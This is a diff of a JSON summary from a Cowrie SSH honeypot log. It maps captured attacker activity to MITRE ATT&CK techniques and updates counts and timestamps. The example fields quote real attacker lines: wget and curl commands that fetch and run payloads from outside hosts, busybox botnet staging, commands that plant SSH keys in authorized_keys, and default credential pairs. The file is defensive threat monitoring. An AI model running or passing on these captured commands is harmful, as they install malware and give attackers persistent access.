@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-10-24 22:08:41",
+  "generated": "2026-10-24 23:04:50",
   "totals": {
-    "commands": 396511,
-    "login_failed": 511780,
-    "login_success": 77473,
-    "sessions": 538924
+    "commands": 396694,
+    "login_failed": 511848,
+    "login_success": 77485,
+    "sessions": 539027
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 511780,
+      "count": 511848,
       "examples": [
         "root / 123456",
         "nobody / None",
@@ -21,14 +21,14 @@
         "admin / admin"
       ],
       "first": "2026-08-10T23:55:42.664651Z",
-      "last": "2026-10-24T22:08:07.260566Z",
-      "unique_ips": 7729
+      "last": "2026-10-24T23:04:47.671961Z",
+      "unique_ips": 7731
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 77473,
+      "count": 77485,
       "examples": [
         "root / admin",
         "uname -a / exit",
@@ -37,14 +37,14 @@
         "admin / vertex25ektks123"
       ],
       "first": "2026-08-10T23:55:55.666658Z",
-      "last": "2026-10-24T21:54:17.572319Z",
-      "unique_ips": 6353
+      "last": "2026-10-24T22:54:16.764669Z",
+      "unique_ips": 6354
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 47862,
+      "count": 47912,
       "examples": [
         "/bin/busybox cp /bin/echo dvrHelper; >dvrHelper; /bin/busybox chmod 777 dvrHelper; /bin/busybox ECCHI",
         ">/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/",
@@ -53,14 +53,14 @@
         ">/var/run/d && chmod 777 /var/run/d && /var/run/d && cd /var/run/"
       ],
       "first": "2026-08-11T00:40:37.500509Z",
-      "last": "2026-10-24T21:54:19.891859Z",
+      "last": "2026-10-24T22:54:19.069446Z",
       "unique_ips": 2449
     },
     {
       "id": "T1083",
       "name": "File and Directory Discovery",
       "tactic": "Discovery",
-      "count": 30000,
+      "count": 30011,
       "examples": [
         "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# =================================",
         "ls -la ~/.local/share/TelegramDesktop/tdata /home/*/.local/share/TelegramDesktop/tdata /dev/ttyGSM* /dev/ttyUSB-mod* /va",
@@ -69,14 +69,14 @@
         "cd /tmp || cd /var/ || cd /var/run || cd /mnt || cd /root || cd /; rm -rf i; wget http://192.168.1.1:8088/i; curl -O htt"
       ],
       "first": "2026-08-11T01:37:17.632875Z",
-      "last": "2026-10-24T21:54:06.186460Z",
-      "unique_ips": 1327
+      "last": "2026-10-24T22:46:38.887569Z",
+      "unique_ips": 1328
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 14378,
+      "count": 14395,
       "examples": [
         "(wget http://77.90.185.66/wget -O- || busybox wget http://77.90.185.66/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "http://77.90.185.66/wget",
@@ -85,14 +85,14 @@
         "curl -sL -o /tmp/install.sh https://del.sou.pp.ua/install.sh && bash /tmp/install.sh; rm -f /tmp/install.sh"
       ],
       "first": "2026-08-11T00:40:37.931453Z",
-      "last": "2026-10-24T21:54:05.815136Z",
-      "unique_ips": 2245
+      "last": "2026-10-24T22:46:38.882651Z",
+      "unique_ips": 2246
     },
     {
       "id": "T1082",
       "name": "System Information Discovery",
       "tactic": "Discovery",
-      "count": 11985,
+      "count": 11986,
       "examples": [
         "uname -s -v -n -r -m",
         "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# =================================",
@@ -101,7 +101,7 @@
         "uname -s -m"
       ],
       "first": "2026-08-11T00:27:16.369209Z",
-      "last": "2026-10-24T21:54:07.593750Z",
+      "last": "2026-10-24T22:46:38.887569Z",
       "unique_ips": 1846
     },
     {
@@ -124,7 +124,7 @@
       "id": "T1489",
       "name": "Service Stop",
       "tactic": "Impact",
-      "count": 2620,
+      "count": 2632,
       "examples": [
         "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# =================================",
         "for pid in /proc/[0-9]*; do pid_num=\"${pid##*/}\"; if [ -r \"$pid/maps\" ]; then suspicious=true; while IFS= read -r line; ",
@@ -133,8 +133,8 @@
         "#!/bin/sh\n\nfor proc_dir in /proc/*; do\n    pid=${proc_dir##*/}\n\n    result=$(ls -l \"/proc/$pid/exe\" 2> /dev/null)\n\n    i"
       ],
       "first": "2026-08-11T01:37:17.632875Z",
-      "last": "2026-10-24T21:54:05.173578Z",
-      "unique_ips": 640
+      "last": "2026-10-24T22:46:38.887569Z",
+      "unique_ips": 641
     },
     {
       "id": "T1057",
@@ -156,14 +156,14 @@
       "id": "T1098.004",
       "name": "Account Manipulation: SSH Authorized Keys",
       "tactic": "Persistence",
-      "count": 1275,
+      "count": 1276,
       "examples": [
         "mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo \"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHQGOxKK322AbGwPqefUy1MUBZ",
         "chmod +x clean.sh; sh clean.sh; rm -rf clean.sh; chmod +x setup.sh; sh setup.sh; rm -rf setup.sh; mkdir -p ~/.ssh; chatt",
         "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1"
       ],
       "first": "2026-08-11T01:37:12.477623Z",
-      "last": "2026-10-24T21:54:00.397917Z",
+      "last": "2026-10-24T22:46:34.109382Z",
       "unique_ips": 1179
     },
     {
@@ -186,7 +186,7 @@
       "id": "T1059.004",
       "name": "Command and Scripting Interpreter: Unix Shell",
       "tactic": "Execution",
-      "count": 485,
+      "count": 486,
       "examples": [
         "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# =================================",
         "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || ",
@@ -195,7 +195,7 @@
         "echo goJ53E8MJK && cd /tmp; echo lvjxeOQcpz > dElaIHAYTj && sleep 27 &"
       ],
       "first": "2026-08-11T01:37:17.632875Z",
-      "last": "2026-10-24T20:33:07.073568Z",
+      "last": "2026-10-24T22:46:38.887569Z",
       "unique_ips": 53
     },
     {
@@ -228,14 +228,14 @@
       "id": "T1037",
       "name": "Boot or Logon Initialization Scripts",
       "tactic": "Persistence",
-      "count": 82,
+      "count": 83,
       "examples": [
         "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# =================================",
         "#!/bin/bash\n# \u2500\u2500 Auto-defesa: se o arquivo foi corrompido com \\r\\n de novo, limpa e re-executa\nif grep -q $'\\r' \"$0\" 2>/",
         "cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var/tmp || cd /dev || cd .; M=$(uname -m 2>/dev/null); case \"$M\""
       ],
       "first": "2026-08-11T01:37:17.632875Z",
-      "last": "2026-10-23T16:31:51.113635Z",
+      "last": "2026-10-24T22:46:38.887569Z",
       "unique_ips": 5
     },
     {
@@ -352,35 +352,35 @@
   "unmapped": [
     [
       "sh",
-      69970
+      69980
     ],
     [
       "system",
-      69432
+      69442
     ],
     [
       "shell",
-      43046
+      43056
     ],
     [
       "/bin/busybox",
-      11278
+      11300
     ],
     [
       "/bin/busybox HISILICON",
-      10432
+      10444
     ],
     [
       "enable",
-      8240
+      8249
     ],
     [
       "ping; sh",
-      6864
+      6872
     ],
     [
       "/bin/busybox cat /proc/self/exe || cat /proc/self/exe",
-      3422
+      3426
     ],
     [
       "/bin/busybox UNSTABLE",
@@ -392,15 +392,15 @@
     ],
     [
       "sh .k",
-      1760
+      1770
     ],
     [
       "linuxshell",
-      1148
+      1149
     ],
     [
       "ping ;sh",
-      939
+      940
     ],
     [
       "cd /proc && cat self/cmdline",
@@ -433,10 +433,10 @@
   ],
   "data_since": "2026-08-10T23:55:42",
   "last_24h": {
-    "sessions": 10678,
-    "logins": 10508,
-    "commands": 22549,
-    "downloads": 557,
-    "unique_ips": 450
+    "sessions": 10159,
+    "logins": 10048,
+    "commands": 22455,
+    "downloads": 571,
+    "unique_ips": 460
   }
 }
